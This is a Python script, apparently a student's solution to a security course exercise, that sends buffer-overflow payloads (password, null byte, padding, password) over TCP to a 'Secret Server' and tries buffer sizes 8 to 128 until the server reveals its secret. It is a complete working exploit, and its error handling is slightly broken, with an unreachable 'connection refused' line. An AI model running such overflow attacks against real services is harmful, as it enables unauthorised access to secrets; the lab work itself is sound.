import argparse
import socket
import sys
import time

# implement this function
# add additional helper functions/classes if you need
def run_exploit(hostname, port):
    new_password = 'secret' 
    password_length = len(new_password)

    # Iterate over all potential buffer sizes
    for BUFFSIZE in range(8, 129):
        # Calculate padding_length to cause buffer oveflow
        padding_length = BUFFSIZE - password_length - 1 - password_length  # BUFFSIZE - len(new_password) - '\x00' - len(new_password)

        # Skip if padding_length is negative (invalid for current BUFFSIZE)
        if padding_length < 0:
            continue

        padding = '.' * padding_length

        # Construct the payload
        # [new_password][\x00][padding][new_password]\n
        payload = f"{new_password}\x00{padding}{new_password}\n"

        try:

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)  # Set a timeout of 2 seconds for socket operations
                s.connect((hostname, port))

                # Example initial_response: "Secret Server 1.0\nPassword:"
                initial_response = s.recv(1024).decode()
                #Need to encode payload to binary
                s.sendall(payload.encode())

                response = s.recv(4096).decode()

                if "The secret is:" in response:
                    secret = response.split("The secret is: ")[1].strip()
                    return secret

        except socket.timeout:
            print(f"Connection timed out for BUFFSIZE={BUFFSIZE}.")
            continue
            print(f"Connection refused for BUFFSIZE={BUFFSIZE}.")
            continue
        except Exception as e:
            print(f"An error occurred for BUFFSIZE={BUFFSIZE}: {e}")
            continue

    # If the loop completes without finding the secret
    return "Secret not found."

# =================================================================
# Do not modify any lines below
# =================================================================

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", help="hostname or IP address")
    parser.add_argument("port", help="port number", type=int)
    args = parser.parse_args()
    print(f"Running exploit on {args.hostname}:{args.port}")
    secret = run_exploit(args.hostname, args.port)
    print(f"Secret = {secret}")

if __name__ == "__main__":
    main()
    